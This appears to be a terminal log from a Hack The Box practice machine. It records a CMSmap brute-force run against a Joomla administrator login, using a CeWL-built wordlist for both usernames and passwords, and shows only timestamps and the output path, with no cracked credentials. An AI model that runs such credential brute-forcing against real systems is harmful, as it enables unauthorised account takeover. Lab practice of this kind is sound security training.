/usr/local/bin/cmsmap http://10.10.10.150/administrator -f J -u ./cewl.out -p ./cewl.out -o /media/sf_VM_SHARED/htb/10.10.10.150/cmsmap.brute.txt
[-] Date & Time: 30/01/2019 00:03:07
[-] Target: http://10.10.10.150/administrator (10.10.10.150)
[-] Starting Brute Forcing: J
[-] Date & Time: 30/01/2019 00:03:58
[-] Completed in: 0:00:50
[-] Output File Saved in: /media/sf_VM_SHARED/htb/10.10.10.150/cmsmap.brute.txt